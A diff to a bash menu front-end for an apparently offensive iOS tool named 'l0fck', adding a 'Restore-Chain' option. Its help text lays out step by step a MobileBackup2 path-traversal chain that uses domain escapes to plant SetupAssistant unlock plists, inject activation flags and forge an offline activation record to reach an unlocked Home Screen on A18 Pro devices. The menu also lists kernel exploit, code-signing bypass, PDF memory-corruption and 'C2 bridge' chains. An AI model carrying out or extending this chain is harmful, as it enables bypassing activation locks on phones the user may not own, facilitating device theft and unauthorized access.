@@ -195,7 +195,7 @@ EOF
 
 print_doc_self_test() {
     cat <<'EOF'
-Host-only embedded unit test suite (18 tests). Validates parsers,
+Host-only embedded unit test suite (22 tests). Validates parsers,
 synthesizers, and lifecycle helpers without a connected device:
 Port DFU serial parser, Base64 codec, A18 target gating, activation
 record synthesizer, DNS/HTTP captive parsers, mobileconfig generator,
@@ -203,9 +203,11 @@ root CA PEM, .IPS crash triage parser, PurpleBuddy/SpringBoard plist
 synthesizers, session manager init, SetupAssistant/iTunes plists,
 AppleAVE2 portal telemetry parser, SetupAssistant activation engine,
 KASLR slide & slid addressing, KRW HTTP C2 bridge with dynamic
-discovery (allproc walk, DeviceTree, PTOV table simulation), and
-GlyphGrift PDF payload existence & telemetry structure lifecycle,
-and GlyphGrift V2 exploit telemetry (crash≠krw_ready, k128/k192 PDFs).
+discovery (allproc walk, DeviceTree, PTOV table simulation), GlyphGrift
+PDF payload/telemetry lifecycle, GlyphGrift V2 exploit telemetry
+(crash≠krw_ready, k128/k192 PDFs), KASLR anchor table, sentinel canary
+read-back, renderer heartbeat, and Restore-Chain manifest/mbdb
+synthesizer with domain-escape traversal round-trip.
 EOF
 }
 
@@ -274,6 +276,38 @@ Operator selects delivery vector before start:
   2) <object> inline CG PDF render path
 Heap-only for exploit stages; --glyphgrift-stack remains research-only.
 Fixed in iOS 26.7.1. Target iOS 26.6.1 (23G83) is vulnerable.
+EOF
+}
+
+print_doc_restore_chain() {
+     cat <<'EOF'
+CVE-2026-84598 class — MobileBackup2 (com.apple.mobilebackup2) restore-
+staging path-traversal chain. Over a plain USB lockdown connection (no
+kernel exploit, no Wi-Fi) the host drives a full mb2 restore session:
+version exchange -> "Hello" (SupportedProtocolVersions [2.0, 2.1]) ->
+serve Manifest.plist (Version 8.0, SystemDomainsVersion 19.0) -> stream a
+synthesized .mbdb (magic "mbdb", major 1, per-entry domain/path/props
+bplist) over the device-link file stream, where phase-1 entries use
+domain escapes (SysContainerDomain-../..) to stage canary files at the
+/var/mobile/Media in-jail root and /var/tmp, and phase-2 entries plant
+purplebuddy / SetupAssistant unlock plists under /var/mobile/Library.
+A hard gate (stage 4) re-reads the phase-1 canary over plain AFC before
+any unlock stage runs; if the traversal did not materialize at copy time
+the chain stops honestly (parse-accept alone is not a write primitive).
+On confirmation it reuses the proven post-exploit stack: lockdown flag
+ injection, synthesized offline A18 Pro activation, SpringBoard/Setup
+ preferences, a 14-event Darwin dismissal burst, and a respring into the
+ unlocked Home Screen. Target gate: A18 Pro / iOS 26.6.1 (23G83).
+
+ TRANSPORT (by target): on the A18 Pro the legacy-lockdown
+ com.apple.mobilebackup2 service is NOT registered (idevicebackup2:
+ TLS + notification_proxy + AFC OK, then StartService com.apple.mobilebackup2
+ -> InvalidService, even on a paired host). So the mb2 session runs over the
+ CoreDevice RSD transport (service com.apple.mobilebackup2.shim.remote) via a
+ bundled pymobiledevice3 sidecar (l0fck/tools/mb2_coredevice.py, venv
+ l0fck/tools/.venv); the host must be paired + trusted AND CoreDevice-paired
+ (Developer Mode on). A13-class devices use the legacy lockdown path unchanged.
+ Phase 0 probe: l0fck/tools/mb2_reachability.py (REACHABLE gates Phase 1).
 EOF
 }
 
@@ -486,11 +520,28 @@ print_art_setup_assistant_chain() {
              v                                                 |
     WebSheet Dismissed     <--- Serves 'Success' & Albert <----+
              |
-             +---> Optional USB Attachment:
-                      |---> Flag Injection (ActivationState=Activated)
-                      |---> Offline A18 Pro Activation Record
-                      |---> 14 Darwin Dismissal Broadcasts
-                      `---> SpringBoard Respring -> Unlocked Home Screen!
+              +---> Optional USB Attachment:
+                       |---> Flag Injection (ActivationState=Activated)
+                       |---> Offline A18 Pro Activation Record
+                       |---> 14 Darwin Dismissal Broadcasts
+                       `---> SpringBoard Respring -> Unlocked Home Screen!
+EOF
+}
+
+print_art_restore_chain() {
+     cat <<'EOF'
++---------------------------------------------------------------------+
+|                 RESTORE-CHAIN (MobileBackup2 Traversal)             |
++---------------------------------------------------------------------+
+|  STAGE 0: PREFLIGHT (A18 Pro / iOS 26.6.1 gate, Find My manual off) |
+|  STAGE 1: MB2 SESSION (lockdown service, v400/0, Hello [2.0, 2.1])  |
+|  STAGE 2: MANIFEST + .MBDB STREAM (domain escapes -> canary files)  |
+|  STAGE 3: 211 GATE RETRY (max 3 rounds; wedge -> reboot recovery)   |
+|  STAGE 4: HARD GATE (plain-AFC canary read = confirmed write)       |
+|  STAGE 5: UNLOCK ARTIFACTS (purplebuddy/SetupAssistant plists)      |
+|  STAGE 6: FINALIZE (flags, offline activation, Darwin burst,        |
+|            respring -> unlocked Home Screen)                        |
++---------------------------------------------------------------------+
 EOF
 }
 
@@ -811,11 +862,12 @@ menu_advanced_chains() {
         echo -e "${BOLD}5.${RESET}  ${CYAN}${BOLD}Neo-Chain (Kernel Exploitation Bypass)${RESET}"
         echo -e "${BOLD}6.${RESET}  ${CYAN}${BOLD}SetupAssistant-Chain (Wi-Fi Portal, WebSheet & AppleAVE2 Video Kernel Exploit)${RESET}"
         echo -e "${BOLD}7.${RESET}  ${CYAN}${BOLD}GlyphGrift-Chain (CVE-2026-86950 CoreGraphics PDF OOB Write)${RESET}"
+        echo -e "${BOLD}8.${RESET}  ${CYAN}${BOLD}Restore-Chain (MobileBackup2 Restore-Staging Traversal)${RESET}"
         echo ""
         echo -e "${BOLD}B.${RESET}  Back"
         echo -e "${BOLD}0.${RESET}  Exit"
         echo "----------------------------------------------------------------------"
-        echo -n "Select an option [1-7, B, 0]: "
+        echo -n "Select an option [1-8, B, 0]: "
         read -r choice
 
         case "$choice" in
@@ -958,6 +1010,32 @@ menu_advanced_chains() {
                         "${base_cmd[@]}"
                 fi
                 ;;
+            8)
+                print_banner
+                echo -e "${CYAN}${BOLD}Restore-Chain Mode${RESET}"
+                echo ""
+                echo "Select Restore-Chain Mode:"
+                echo "  1) Full Chain (stages 0-6, unlock to Home Screen)"
+                echo "  2) Probe Only (stages 0-3, protocol validation, no unlock)"
+                echo ""
+                echo -n "Choose mode [1-2, default: 1]: "
+                read -r rmode
+                if [ "$rmode" = "2" ]; then
+                    run_confirmed "8" "Restore-Chain (Probe Only)" \
+                        "./l0fck --restore-probe" \
+                        "ON, USB-connected, A18 Pro, iOS 26.6.1, Find My OFF" \
+                        "${YELLOW}Caution: mb2 restore session, no unlock stages${RESET}" \
+                        print_doc_restore_chain print_art_restore_chain \
+                        ./l0fck --restore-probe
+                else
+                    run_confirmed "8" "Restore-Chain (Full, unlock to Home Screen)" \
+                        "./l0fck --restore-chain" \
+                        "ON, USB-connected, A18 Pro, iOS 26.6.1, Find My OFF" \
+                        "${RED}Danger: restore-staging traversal + unlock chain${RESET}" \
+                        print_doc_restore_chain print_art_restore_chain \
+                        ./l0fck --restore-chain
+                fi
+                ;;
             [Bb]) return ;;
             0) echo -e "\n${CYAN}Exiting l0fck. Goodbye!${RESET}\n"; exit 0 ;;
             *) echo -e "\n${RED}Invalid selection.${RESET}"; sleep 1 ;;
@@ -969,8 +1047,7 @@ menu_diagnostics() {
     while true; do
         print_banner
         echo -e "${CYAN}${BOLD}Diagnostics${RESET}"
-        echo ""
-        echo -e "${BOLD}1.${RESET}  Run Embedded Self-Tests (18/18 Verification)"
+        echo -e "${BOLD}1.${RESET}  Run Embedded Self-Tests (22/22 Verification)"
         echo -e "${BOLD}2.${RESET}  Test Kernel Exploit Primitive (V-047 / MCC)"
         echo -e "${BOLD}3.${RESET}  Test AMFI / CoreTrust Bypass"
         echo ""
